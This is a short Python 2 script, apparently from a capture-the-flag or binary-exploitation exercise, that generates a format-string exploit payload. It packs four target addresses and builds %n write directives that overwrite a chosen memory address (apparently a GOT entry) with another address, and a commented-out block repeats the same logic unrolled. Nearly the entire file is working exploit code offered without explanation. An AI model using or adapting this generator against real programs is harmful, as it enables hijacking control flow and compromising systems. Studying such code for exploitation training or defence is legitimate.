dummyString = "AAAAA";
addressToWrite = "0804856d";
addressToOverwrite = "8049fa0";
distanceInWords = 7;

splitsAddressToOverwrite = [addressToOverwrite[x:x+2] for x in range(0,len(addressToOverwrite),2)]
splitsAddressToWrite = [addressToWrite[x:x+2] for x in range(0,len(addressToWrite),2)]

byte = [None]*4;

for index in range(0, 4): 
	byte[index] = format(int(splitsAddressToOverwrite[3], 16) + index ,'x');
	byte[index] = byte[index] if (len(byte[index]) == 2) else "0"+byte[index];

addressString = dummyString;
for index in range(0, 4):
	addressString = (addressString + "\\x"+byte[index]+"\\x"+splitsAddressToOverwrite[2]+"\\x"+splitsAddressToOverwrite[1]+"\\x"+splitsAddressToOverwrite[0]);


initialNum = len(dummyString)+16;
offset = [None]*4;

offset[0] = int(splitsAddressToWrite[3],16) - initialNum;
if offset[0] < 8:
	 offset[0] = int(splitsAddressToWrite[3],16) + 256 - initialNum;

j = 1;
for index in xrange(3, 0, -1): 
	offset[j] = int(splitsAddressToWrite[index-1],16) - int(splitsAddressToWrite[index],16);
	if offset[j] < 8:
		 offset[j] = int(splitsAddressToWrite[index-1],16) + 256 - int(splitsAddressToWrite[index],16);
	j = j + 1;

distanceInWords = distanceInWords + len(dummyString)/4;

exploitString = "";

for index in range(0, 4):
	exploitString = (exploitString + "%" + str(distanceInWords) + "\$" + str(offset[index]) + "x%" + str(distanceInWords+index) + "\$n");

finalExploitString = addressString + exploitString;

print (finalExploitString);



'''


byteOneAdd = format(int(splitsAddressToOverwrite[3], 16),'x');
byteOneAdd = byteOneAdd if (len(byteOneAdd) == 2) else "0"+byteOneAdd;

byteTwoAdd = format(int(splitsAddressToOverwrite[3], 16)+1,'x');
byteTwoAdd = byteTwoAdd if (len(byteTwoAdd) == 2) else "0"+byteTwoAdd;

byteThreeAdd = format(int(splitsAddressToOverwrite[3], 16)+2,'x');
byteThreeAdd = byteThreeAdd if (len(byteThreeAdd) == 2) else "0"+byteThreeAdd;

byteFourAdd = format(int(splitsAddressToOverwrite[3], 16)+3,'x');
byteFourAdd = byteFourAdd if (len(byteFourAdd) == 2) else "0"+byteFourAdd;

addressString =  (dummyString + "\\x"+byteOneAdd+"\\x"+splitsAddressToOverwrite[2]+"\\x"+splitsAddressToOverwrite[1]+"\\x"+splitsAddressToOverwrite[0] +
					"\\x"+byteTwoAdd+"\\x"+splitsAddressToOverwrite[2]+"\\x"+splitsAddressToOverwrite[1]+"\\x"+splitsAddressToOverwrite[0] +
					"\\x"+byteThreeAdd+"\\x"+splitsAddressToOverwrite[2]+"\\x"+splitsAddressToOverwrite[1]+"\\x"+splitsAddressToOverwrite[0] +
					"\\x"+byteFourAdd+"\\x"+splitsAddressToOverwrite[2]+"\\x"+splitsAddressToOverwrite[1]+"\\x"+splitsAddressToOverwrite[0]);


firstOffset = int(splitsAddressToWrite[3],16) - initialNum;
if firstOffset < 8:
	 firstOffset = int(splitsAddressToWrite[3],16) + 256 - initialNum;

secondOffset = int(splitsAddressToWrite[2],16) - int(splitsAddressToWrite[3],16);
if secondOffset < 8:
	 secondOffset = int(splitsAddressToWrite[2],16) + 256 - int(splitsAddressToWrite[3],16);

thirdOffset = int(splitsAddressToWrite[1],16) - int(splitsAddressToWrite[2],16);
if thirdOffset < 8:
	 thirdOffset = int(splitsAddressToWrite[1],16) + 256 - int(splitsAddressToWrite[2],16);

fourthOffset = int(splitsAddressToWrite[0],16) - int(splitsAddressToWrite[1],16);
if fourthOffset < 8:
	 fourthOffset = int(splitsAddressToWrite[0],16) + 256 - int(splitsAddressToWrite[1],16);


distanceInWords = distanceInWords + len(dummyString)/4;


exploitString = ("%" + str(distanceInWords) + "\$" + str(firstOffset) + "x%" + str(distanceInWords) + "\$n" + 
				"%" + str(distanceInWords) + "\$" + str(secondOffset) + "x%" + str(distanceInWords+1) + "\$n" + 
				"%" + str(distanceInWords) + "\$" + str(thirdOffset) + "x%" + str(distanceInWords+2) + "\$n" + 
				"%" + str(distanceInWords) + "\$" + str(fourthOffset) + "x%" + str(distanceInWords+3) + "\$n");

finalExploitString = addressString + exploitString;

print (finalExploitString);


'''

